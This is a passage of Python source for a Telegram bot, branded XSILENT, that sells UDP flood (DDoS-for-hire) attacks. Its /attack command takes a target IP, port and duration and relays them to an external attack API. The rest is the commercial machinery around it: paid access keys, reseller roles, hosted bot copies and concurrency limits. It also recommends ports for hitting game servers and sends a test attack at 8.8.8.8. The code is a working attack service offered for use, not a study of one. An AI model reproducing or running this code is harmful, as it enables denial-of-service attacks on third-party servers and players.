    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    is_group = (chat_type == "group" or chat_type == "supergroup")
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if is_group:
        group_id = str(msg.chat.id)
        attack_time_limit = get_group_attack_time(group_id)
        if not attack_time_limit:
            bot.reply_to(msg, f"❌ Group not approved!\n\n🛒 Contact: XSILENT")
            return
    else:
        attack_time_limit = 300
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers and not is_group:
        bot.reply_to(msg, f"❌ Unauthorized!\n\n🛒 Buy: XSILENT")
        return
    
    if not is_group and uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, f"❌ Your access has expired!\n\n🛒 Buy new key: XSILENT")
        return
    
    # GLOBAL CONCURRENT CHECK
    global_active = get_global_active_count()
    if global_active >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ **GLOBAL LIMIT REACHED!**\n\n🌐 Total active attacks across ALL bots: `{global_active}/{MAX_CONCURRENT}`\n💡 Wait for an attack to finish before starting a new one.\n\n🛒 Buy: XSILENT", parse_mode='Markdown')
        return
    
    if uid in cooldown and not is_group:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!\n💡 Use /cooldown to check")
            return
    
    args = msg.text.split()
    if is_group:
        if len(args) != 3:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT\n📌 Example: /attack 1.1.1.1 443")
            return
        ip, port = args[1], args[2]
        duration = attack_time_limit
    else:
        if len(args) != 4:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
            return
        ip, port, duration = args[1], args[2], args[3]
        try:
            duration = int(duration)
        except:
            bot.reply_to(msg, "❌ Invalid time!")
            return
    
    try:
        port = int(port)
        if duration < 10 or duration > attack_time_limit:
            bot.reply_to(msg, f"❌ Duration must be 10-{attack_time_limit} seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port!")
        return
    
    # Check if target already under attack globally
    target_key = f"{ip}:{port}"
    now = time.time()
    for aid, ainfo in global_active_attacks.items():
        if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
            remaining = int(ainfo["finish_time"] - now)
            bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n\n🎯 {ip}:{port}\n👤 By: {ainfo['user']}\n⏰ Finishes in: {remaining}s")
            return
    
    if not is_group:
        cooldown[uid] = time.time()
    
    attack_id = f"main_{uid}_{int(time.time())}"
    finish_time = time.time() + duration
    
    # Add to global tracking
    add_global_attack(attack_id, uid, target_key, finish_time, "main", None)
    
    new_total = get_global_active_count()
    bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Global Active: {new_total}/{MAX_CONCURRENT}", parse_mode='Markdown')
    
    def run():
        retry = 0
        while retry < 3:
            try:
                api_params = {
                    "api_key": API_KEY,
                    "target": ip,
                    "port": port,
                    "time": duration,
                    "concurrent": 1,
                    "method": "udp"
                }
                response = requests.get(API_URL, params=api_params, timeout=10)
                if response.status_code == 200:
                    time.sleep(duration)
                    bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
                    break
                else:
                    retry += 1
                    if retry < 3:
                        time.sleep(2)
                        continue
                    bot.send_message(msg.chat.id, f"❌ Attack failed!\n\n🛒 Contact: XSILENT")
            except:
                retry += 1
                if retry < 3:
                    time.sleep(2)
                    continue
                bot.send_message(msg.chat.id, f"❌ Attack failed! API offline.\n\n🛒 Contact: XSILENT")
        remove_global_attack(attack_id)
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    global_count = get_global_active_count()
    
    status_msg = f"🌐 **GLOBAL ATTACK STATUS**\n"
    status_msg += f"📊 **Active Attacks:** `{global_count}/{MAX_CONCURRENT}`\n"
    
    if global_count >= MAX_CONCURRENT:
        status_msg += f"❌ **LIMIT REACHED!** No more attacks can start.\n"
    else:
        status_msg += f"✅ **{MAX_CONCURRENT - global_count} slots available**\n"
    
    status_msg += f"\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if global_count > 0:
        status_msg += f"**ACTIVE ATTACKS:**\n"
        for attack_id, info in global_active_attacks.items():
            remaining = int(info["finish_time"] - time.time())
            if remaining > 0:
                bot_type = "🤖 HOSTED" if info["bot_type"] == "hosted" else "🔥 MAIN"
                status_msg += f"\n❌ `{info['target_key']}`\n└ 👤 `{info['user']}`\n└ {bot_type}\n└ ⏰ `{remaining}s` left"
    else:
        status_msg += f"✅ **NO ACTIVE ATTACKS**\n└ 💡 All slots are free!"
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            status_msg += f"\n\n⏳ **YOUR COOLDOWN:** `{int(remaining)}s`"
    
    status_msg += f"\n\n🛒 Buy: XSILENT"
    bot.reply_to(msg, status_msg, parse_mode='Markdown')

@bot.message_handler(commands=['host'])
def host_bot(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "⚠️ Usage: /host BOT_TOKEN USER_ID CONCURRENT OWNER_NAME\n📌 Concurrent: 1-100\n📌 Example: /host 123456:ABC 8487946379 10 MONSTER")
        return
    
    bot_token = args[1]
    owner_id = args[2]
    try:
        concurrent = int(args[3])
        if concurrent < 1 or concurrent > 100:
            bot.reply_to(msg, "❌ Concurrent must be between 1 and 100!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid concurrent value!")
        return
    
    owner_name = args[4]
    
    save_hosted_bot(bot_token, owner_id, owner_name, concurrent)
    hosted_bots[bot_token] = {
        "owner_id": owner_id,
        "owner_name": owner_name,
        "concurrent": concurrent,
        "blocked": False,
        "active_attacks": {},
        "users": [],
        "resellers": []
    }
    
    if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
        bot.reply_to(msg, f"✅ HOSTED BOT STARTED!\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n⏳ Cooldown: {COOLDOWN_TIME}s\n🌐 Global Limit: {MAX_CONCURRENT}\n\n💡 Bot is now live!")
    else:
        bot.reply_to(msg, "❌ Failed to start hosted bot!\nCheck token and try again.")

@bot.message_handler(commands=['unhost'])
def unhost_bot(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /unhost BOT_TOKEN")
        return
    
    bot_token = args[1]
    
    if bot_token in hosted_bots or bot_token in hosted_bot_instances:
        stop_hosted_bot(bot_token)
        bot.reply_to(msg, f"✅ HOSTED BOT STOPPED!\n\n🔑 Token: {bot_token[:20]}...\n💡 Bot is now completely offline.")
    else:
        bot.reply_to(msg, "❌ Hosted bot not found!")

@bot.message_handler(commands=['blockhost'])
def block_host_bot(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /blockhost BOT_TOKEN\n📌 Example: /blockhost 123456789:ABC")
        return
    
    bot_token = args[1]
    
    if bot_token not in hosted_bots:
        bot.reply_to(msg, "❌ Hosted bot not found!")
        return
    
    hosted_bots[bot_token]["blocked"] = True
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {"blocked": True}}
    )
    
    bot.reply_to(msg, f"✅ HOSTED BOT BLOCKED!\n\n🔑 Token: {bot_token[:20]}...\n💀 Bot is now blocked!\n\n⚠️ Anyone using this bot will see: 'bot is blocked'")

@bot.message_handler(commands=['unblockhost'])
def unblock_host_bot(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /unblockhost BOT_TOKEN")
        return
    
    bot_token = args[1]
    
    if bot_token not in hosted_bots:
        bot.reply_to(msg, "❌ Hosted bot not found!")
        return
    
    hosted_bots[bot_token]["blocked"] = False
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {"blocked": False}}
    )
    
    bot.reply_to(msg, f"✅ HOSTED BOT UNBLOCKED!\n\n🔑 Token: {bot_token[:20]}...\n💚 Bot is now active again!")

@bot.message_handler(commands=['allhosts'])
def all_hosts(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    host_list = []
    for token, info in hosted_bots.items():
        status = "🔴 BLOCKED" if info.get("blocked", False) else "🟢 ACTIVE"
        host_list.append(f"🔑 {token[:20]}...\n└ 👑 Owner: {info['owner_id']}\n└ 📛 Name: {info['owner_name']}\n└ ⚡ Concurrent: {info['concurrent']}\n└ {status}")
    
    if host_list:
        bot.reply_to(msg, f"📋 **ALL HOSTED BOTS:**\n\n" + "\n\n".join(host_list) + f"\n\n📊 Total: {len(hosted_bots)}", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "📋 **No hosted bots found!**", parse_mode='Markdown')

@bot.message_handler(commands=['maintenance'])
def maintenance(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /maintenance on or /maintenance off")
        return
    
    global maintenance_mode
    status = args[1].lower()
    
    if status == "on":
        maintenance_mode = True
        bot.reply_to(msg, "🔧 MAINTENANCE MODE ENABLED 🔧\n\nBot commands are now disabled.\nUse /maintenance off to disable.")
    elif status == "off":
        maintenance_mode = False
        bot.reply_to(msg, "✅ MAINTENANCE MODE DISABLED ✅\n\nBot is now fully operational!")
    else:
        bot.reply_to(msg, "❌ Invalid status! Use on or off")

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
        return
    
    duration_str = args[1]
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ Invalid duration!\nUse: 1 (1 day) or 5h (5 hours)")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    
    keys_data[key] = {
        "user_id": "pending",
        "duration_value": value,
        "duration_unit": unit,
        "generated_by": uid,
        "generated_at": time.time(),
        "expires_at": expires_at.timestamp(),
        "used": False
    }
    save_keys(keys_data)
    
    expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(value, unit)
    
    bot.reply_to(msg, f"✅ KEY GENERATED!\n\n🔑 Key: `{key}`\n⏰ Duration: {duration_display}\n📅 Expires: {expiry_str}\n\nShare this key with user!\nUser: /redeem {key}", parse_mode='Markdown')

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Key not found!")
        return
    
    del keys_data[key]
    save_keys(keys_data)
    
    bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")

@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /add USER_ID")
        return
    
    new_user = args[1]
    
    if new_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    
    if new_user in users:
        bot.reply_to(msg, f"❌ User {new_user} already has access!")
        return
    
    users.append(new_user)
    users_data["users"] = users
    save_users(users_data)
    
    bot.reply_to(msg, f"✅ USER ADDED!\n\n👤 User: {new_user}\n✅ Now has attack access!")
    
    try:
        bot.send_message(new_user, "✅ You have been granted attack access!\nUse /start to see commands")
    except:
        pass

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /remove USER_ID")
        return
    
    target_user = args[1]
    
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    
    if target_user not in users:
        bot.reply_to(msg, f"❌ User {target_user} not found!")
        return
    
    remove_user_from_system(target_user)
    
    bot.reply_to(msg, f"✅ USER REMOVED!\n\n👤 User: {target_user}\n❌ Attack access revoked!")
    
    try:
        bot.send_message(target_user, "⚠️ Your attack access has been revoked by owner!")
    except:
        pass

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner as reseller!")
        return
    
    if new_reseller in resellers:
        bot.reply_to(msg, f"❌ User {new_reseller} is already a reseller!")
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    if new_reseller not in users:
        users.append(new_reseller)
        users_data["users"] = users
        save_users(users_data)
    
    bot.reply_to(msg, f"✅ RESELLER ADDED!\n\n👤 Reseller: {new_reseller}\n🔑 Can now generate keys using /genkey")
    
    try:
        bot.send_message(new_reseller, "✅ You have been added as RESELLER!\nYou can now generate keys using /genkey")
    except:
        pass

@bot.message_handler(commands=['removereseller'])
def remove_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
        return
    
    target_reseller = args[1]
    
    if target_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    
    if target_reseller not in resellers:
        bot.reply_to(msg, f"❌ User {target_reseller} is not a reseller!")
        return
    
    resellers.remove(target_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    bot.reply_to(msg, f"✅ RESELLER REMOVED!\n\n👤 User: {target_reseller}\n❌ Can no longer generate keys")
    
    try:
        bot.send_message(target_reseller, "⚠️ Your reseller privileges have been removed!")
    except:
        pass

@bot.message_handler(commands=['addgroup'])
def add_group(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME\n📌 Example: /addgroup -100123456789 60")
        return
    
    group_id = args[1]
    try:
        attack_time = int(args[2])
    except:
        bot.reply_to(msg, "❌ Invalid time!")
        return
    
    if attack_time < 10 or attack_time > 300:
        bot.reply_to(msg, "❌ Attack time must be between 10-300 seconds!")
        return
    
    save_group(group_id, attack_time, uid)
    bot.reply_to(msg, f"✅ GROUP ADDED!\n\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")

@bot.message_handler(commands=['removegroup'])
def remove_group_cmd(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
        return
    
    group_id = args[1]
    remove_group(group_id)
    bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")

@bot.message_handler(commands=['allgroups'])
def all_groups(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    group_list = []
    for group_id, info in groups.items():
        group_list.append(f"👥 `{group_id}`\n└ ⏱️ `{info['attack_time']}s`\n└ 👑 `{info['added_by']}`")
    
    if group_list:
        bot.reply_to(msg, f"📋 **ALL GROUPS:**\n\n" + "\n\n".join(group_list) + f"\n\n📊 Total: `{len(groups)}`", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "📋 **No groups added yet!**", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used!")
        return
    
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, "❌ Key expired!")
        del keys_data[key]
        save_keys(keys_data)
        return
    
    if uid not in users:
        users.append(uid)
    
    users_data["users"] = users
    save_users(users_data)
    
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    
    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
    
    bot.reply_to(msg, f"✅ **ACCESS GRANTED!**\n\n🎉 User `{uid}` activated!\n⏰ Duration: {duration_display}\n📅 Expires: `{expiry_str}`\n⚡ Global Concurrent: `{MAX_CONCURRENT}`\n⏳ Cooldown: `{COOLDOWN_TIME}s`\n\n🛒 Buy: XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['mykeys'])
def mykeys(msg):
    uid = str(msg.chat.id)
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    my_generated_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
            duration_display = format_duration(info['duration_value'], info['duration_unit'])
            my_generated_keys.append(f"🔑 `{key}`\n   ⏰ {duration_display}\n   📅 Expires: `{expires}`")
    
    if my_generated_keys:
        bot.reply_to(msg, f"📋 **YOUR GENERATED KEYS:**\n\n" + "\n\n".join(my_generated_keys), parse_mode='Markdown')
    else:
        bot.reply_to(msg, f"📋 **No keys generated yet!**\n\n🛒 Buy: XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    all_broadcast_users = []
    for user in broadcast_users:
        all_broadcast_users.append(user)
    
    if msg.reply_to_message:
        success_count = 0
        fail_count = 0
        caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
        
        for user in all_broadcast_users:
            try:
                if msg.reply_to_message.photo:
                    bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
                elif msg.reply_to_message.video:
                    bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
                else:
                    bot.send_message(user, caption)
                success_count += 1
            except:
                fail_count += 1
        
        bot.reply_to(msg, f"✅ **BROADCAST SENT!**\n✅ Success: `{success_count}` users\n❌ Failed: `{fail_count}` users", parse_mode='Markdown')
    else:
        args = msg.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption")
            return
        
        message = args[1]
        
        success_count = 0
        fail_count = 0
        
        for user in all_broadcast_users:
            try:
                bot.send_message(user, f"📢 **BROADCAST MESSAGE** 📢\n\n{message}\n\n🛒 Buy: XSILENT", parse_mode='Markdown')
                success_count += 1
            except:
                fail_count += 1
        
        bot.reply_to(msg, f"✅ **BROADCAST SENT!**\n✅ Success: `{success_count}` users\n❌ Failed: `{fail_count}` users", parse_mode='Markdown')

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /stopattack IP:PORT")
        return
    
    target = args[1]
    
    stopped = False
    for attack_id, info in list(global_active_attacks.items()):
        if info["target_key"] == target:
            del global_active_attacks[attack_id]
            stopped = True
            bot.reply_to(msg, f"✅ **ATTACK STOPPED!**\n🎯 Target: `{target}`\n👤 Attacker: `{info['user']}`\n🤖 Bot: `{info['bot_type']}`", parse_mode='Markdown')
            try:
                bot.send_message(info['user'], f"⚠️ Your attack on `{target}` was stopped by owner!", parse_mode='Markdown')
            except:
                pass
            break
    
    if not stopped:
        bot.reply_to(msg, f"❌ No active attack found on `{target}`", parse_mode='Markdown')

@bot.message_handler(commands=['methods'])
def methods(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        bot.reply_to(msg, f"⚡ **UDP AUTO ATTACK**\n\n💡 Best for gaming\n🎯 Recommended ports: `443`, `8080`\n\n📌 **USAGE:**\n`/attack IP PORT`", parse_mode='Markdown')
    elif uid in users or uid in ADMIN_ID or uid in resellers:
        bot.reply_to(msg, f"⚡ **UDP AUTO ATTACK**\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: `443`, `8080`, `14000`\n\n📌 **USAGE:**\n`/attack IP PORT TIME`\n\n📌 **Example:** `/attack 1.1.1.1 443 60`\n\n🛒 Buy: XSILENT", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "❌ Unauthorized!")

@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    has_active = check_user_expiry(uid)
    status_text = "Active" if has_active else "Expired"
    cooldown_text = "Yes" if uid in cooldown else "No"
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            cooldown_text = f"{int(remaining)}s left"
    
    global_count = get_global_active_count()
    
    bot.reply_to(msg, f"📊 **YOUR STATS**\n\n👤 **ID:** `{uid}`\n✅ **Status:** `{status_text}`\n⏳ **Cooldown:** `{cooldown_text}`\n🌐 **Global Active:** `{global_count}/{MAX_CONCURRENT}`\n\n🛒 Buy: XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!", parse_mode='Markdown')
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        bot.reply_to(msg, f"✨ **XSILENT GROUP HELP** ✨\n\n📝 **COMMANDS:**\n`/attack IP PORT` - Launch attack\n`/help` - This menu\n`/start` - Bot info", parse_mode='Markdown')
    elif uid in ADMIN_ID:
        bot.reply_to(msg, f"""👑 **XSILENT OWNER HELP** 👑

📝 **COMMANDS:**

**ATTACK COMMANDS:**
`/attack IP PORT TIME` - Launch attack
`/status` - Check global slots
`/cooldown` - Check your cooldown
`/stopattack IP:PORT` - Stop attack

**SETTINGS:**
`/setmax 1-100` - Set global concurrent limit
`/setcooldown 1-300` - Set cooldown time

**KEY MANAGEMENT:**
`/genkey 1` or `/genkey 5h` - Generate key
`/removekey KEY` - Remove key

**USER MANAGEMENT:**
`/add USER_ID` - Add user
`/remove USER_ID` - Remove user
`/addreseller USER_ID` - Add reseller
`/removereseller USER_ID` - Remove reseller
`/block USER_ID` - Block user
`/unblock USER_ID` - Unblock user
`/allusers` - List all users
`/allblocks` - List blocked users

**GROUP MANAGEMENT:**
`/addgroup GROUP_ID TIME` - Add group
`/removegroup GROUP_ID` - Remove group
`/allgroups` - List groups

**HOSTED BOT MANAGEMENT:**
`/host TOKEN USER_ID CONCURRENT NAME` - Host bot
`/unhost TOKEN` - Remove hosted bot
`/blockhost TOKEN` - Block hosted bot
`/unblockhost TOKEN` - Unblock hosted bot
`/allhosts` - List hosted bots

**OTHER:**
`/broadcast` - Broadcast message
`/maintenance on/off` - Maintenance mode
`/api_status` - API status
`/help` - This menu

⚡ **Global Concurrent:** `{MAX_CONCURRENT}`
⏳ **Cooldown:** `{COOLDOWN_TIME}s`
🛒 **Buy:** XSILENT""")
    elif uid in resellers:
        bot.reply_to(msg, f"""💎 **XSILENT RESELLER HELP** 💎

📝 **COMMANDS:**

`/attack IP PORT TIME` - Launch attack
`/status` - Check global slots
`/cooldown` - Check your cooldown
`/genkey 1` or `/genkey 5h` - Generate key
`/mykeys` - Your generated keys

⚡ **Global Concurrent:** `{MAX_CONCURRENT}`
⏳ **Cooldown:** `{COOLDOWN_TIME}s`
🛒 **Buy:** XSILENT""")
    elif uid in users:
        bot.reply_to(msg, f"""🔥 **XSILENT USER HELP** 🔥

📝 **COMMANDS:**

`/attack IP PORT TIME` - Launch attack
`/status` - Check global slots
`/cooldown` - Check your cooldown
`/redeem KEY` - Activate key

⚡ **Global Concurrent:** `{MAX_CONCURRENT}`
⏳ **Cooldown:** `{COOLDOWN_TIME}s`
🛒 **Buy:** XSILENT""")
    else:
        bot.reply_to(msg, f"❌ **Unauthorized!**\n\nUse `/redeem KEY` to activate\n\n🛒 Buy: XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    user_list = []
    for u in users:
        if u in ADMIN_ID:
            role = "👑 OWNER"
        elif u in resellers:
            role = "💎 RESELLER"
        else:
            role = "👤 USER"
        user_list.append(f"{role}: `{u}`")
    
    bot.reply_to(msg, f"📋 **ALL USERS:**\n\n" + "\n".join(user_list) + f"\n\n📊 Total: `{len(users)}`", parse_mode='Markdown')

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if check_maintenance():
        bot.reply_to(msg, maintenance_message)
        return
    
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
        bot.reply_to(msg, f"✅ **API STATUS**\n\n📡 Status: `{api_status_text}`\n🎯 Active Attacks: `{len(global_active_attacks)}`\n🌐 Global Limit: `{MAX_CONCURRENT}`", parse_mode='Markdown')
    except:
        bot.reply_to(msg, "❌ **API OFFLINE**", parse_mode='Markdown')

def cleanup_global_attacks():
    while True:
        time.sleep(5)
        now = time.time()
        for attack_id, info in list(global_active_attacks.items()):
            if now >= info["finish_time"]:
                del global_active_attacks[attack_id]
        
        for key, info in list(keys_data.items()):
            if info.get("used", False) and now > info["expires_at"]:
                user_id = info.get("used_by")
                if user_id and user_id in users and user_id not in ADMIN_ID:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)

cleanup_thread = threading.Thread(target=cleanup_global_attacks, daemon=True)
cleanup_thread.start()

print("✨ XSILENT BOT STARTED ✨")
print("👑 Owner: 8487946379")
print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"📊 Hosted Bots: {len(hosted_bots)}")
print(f"📢 Broadcast Users: {len(broadcast_users)}")
print(f"🚫 Blocked Users: {len(blocked_users)}")

bot.infinity_polling()
